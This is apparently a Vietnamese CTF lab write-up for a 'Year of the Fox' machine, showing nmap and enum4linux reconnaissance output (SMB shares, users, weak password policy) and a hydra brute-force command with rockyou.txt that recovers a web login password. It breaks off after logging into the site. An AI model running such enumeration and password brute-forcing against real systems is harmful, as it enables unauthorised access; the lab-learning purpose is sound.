# YearOfTheFox

Bước 1 
enumeration : 

nmap -sC -sV [IP_Target]
#######################################################################################
PORT STATE SERVICE REASON VERSION 

80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29

139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX) 

445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
<img width="509" height="134" alt="image" src="https://github.com/user-attachments/assets/aae1fb64-bdd6-4bc4-bd4e-4310e1838e21" />

#######################################################################################



enum4linux
#######################################################################################
enum4linux 10.10.65.232 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 30 21:46:42 2025

======================( Target Information )==============================

Target ........... 10.10.65.232 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

====================( Enumerating Workgroup/Domain on 10.10.65.232 )=====================

[+] Got domain/workgroup name: YEAROFTHEFOX

================( Nbtstat Information for 10.10.65.232 )========================

Looking up status of 10.10.65.232 YEAR-OF-THE-FOX <00> - B Workstation Service YEAR-OF-THE-FOX <03> - B Messenger Service YEAR-OF-THE-FOX <20> - B File Server Service ..MSBROWSE. <01> - B Master Browser YEAROFTHEFOX <00> - B Domain/Workgroup Name YEAROFTHEFOX <1d> - B Master Browser YEAROFTHEFOX <1e> - B Browser Service Elections

    MAC Address = 00-00-00-00-00-00


==========================( Session Check on 10.10.65.232 )===========================

[+] Server 10.10.65.232 allows sessions using username '', password ''

=======================( Getting domain SID for 10.10.65.232 )======================

Domain Name: YEAROFTHEFOX Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup

=============================( OS information on 10.10.65.232 )==========================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.65.232 from srvinfo: YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03

============================( Users on 10.10.65.232 )=================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox Name: fox Desc:

user:[fox] rid:[0x3e8]

========================( Share Enumeration on 10.10.65.232 )========================

    Sharename       Type      Comment
    ---------       ----      -------
    yotf            Disk      Fox's Stuff -- keep out!
    IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))


Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    YEAROFTHEFOX         YEAR-OF-THE-FOX


[+] Attempting to map shares on 10.10.65.232

//10.10.65.232/yotf Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing *//10.10.65.232/IPC$ Mapping: N/A Listing: N/A Writing: N/A

==================( Password Policy Information for 10.10.65.232 )====================

[+] Attaching to 10.10.65.232 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

    [+] YEAR-OF-THE-FOX
    [+] Builtin


[+] Password Info for Domain: YEAR-OF-THE-FOX

    [+] Minimum password length: 5
    [+] Password history length: None
    [+] Maximum password age: 37 days 6 hours 21 minutes 
    [+] Password Complexity Flags: 000000

            [+] Domain Refuse Password Change: 0
            [+] Domain Password Store Cleartext: 0
            [+] Domain Password Lockout Admins: 0
            [+] Domain Password No Clear Change: 0
            [+] Domain Password No Anon Change: 0
            [+] Domain Password Complex: 0

    [+] Minimum password age: None
    [+] Reset Account Lockout Counter: 30 minutes 
    [+] Locked Account Duration: 30 minutes 
    [+] Account Lockout Threshold: None
    [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: DisabledMinimum Password Length: 5

=============================( Groups on 10.10.65.232 )=============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

=============( Users on 10.10.65.232 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID:S-1-22-1

[I] Found new SID:S-1-5-32

[I] Found new SID:S-1-5-32

[I] Found new SID:S-1-5-32

[I] Found new SID:S-1-5-32

[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''

S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)smbS-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group) S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)S-1-5-32-545 BUILTIN\Users (Local Group) S-1-5-32-546 BUILTIN\Guests (Local Group) S-1-5-32-547 BUILTIN\Power Users (Local Group) S-1-5-32-548 BUILTIN\Account Operators (Local Group) S-1-5-32-549 BUILTIN\Server Operators (Local Group) S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\fox (Local User)S-1-22-1-1001 Unix User\rascal (Local User)

=======================( Getting printer info for 10.10.65.232 )======================

No printers returned.

enum4linux complete on Thu Oct 30 22:07:21 2025


quan trọng
#################################################################################################

 Sharename       Type      Comment
    ---------       ----      -------
    yotf            Disk      Fox's Stuff -- keep out!
    IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Workgroup            Master
    ---------            -------
    YEAROFTHEFOX         YEAR-OF-THE-FOX

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\fox (Local User)S-1-22-1-1001 Unix User\rascal (Local User)

S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
smbS-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
 S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
 #################################################################################################


phát hiên port 80 thuộc http 
truy câp và phát hiện khung đăng nhập như sau 
<img width="509" height="134" alt="image" src="https://github.com/user-attachments/assets/aae1fb64-bdd6-4bc4-bd4e-4310e1838e21" />

phát hiện port 139 netbios và samba 445 
hai user khả nghi : 

 S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
 S-1-22-1-1000 Unix User\fox (Local User)S-1-22-1-1001 Unix User\rascal (Local User)
 
file share thông qua Samba :
yotf            Disk      Fox's Stuff -- keep out!

exploite 
 #################################################################################################
 hydra -l rascal -P /home/kali/Downloads/rockyou-master/rockyou.txt 10.10.197.215 http-get / 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-31 00:11:27

 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore 

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking http-get://10.10.197.215:80/ [80][http-get] host: 10.10.197.215 login: rascal password: leonardo 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-31 00:11:57

username : rascal
password : leonardo
(chú ý password thay đổi liên tục)

sau khi có password tiến hành truy cập vào website
<img width="706" height="389" alt="image (1)" src="https://github.com/user-attachments/assets/40575a3e-f614-4142-b384-f83f39e2b07e" />

 #################################################################################################

 




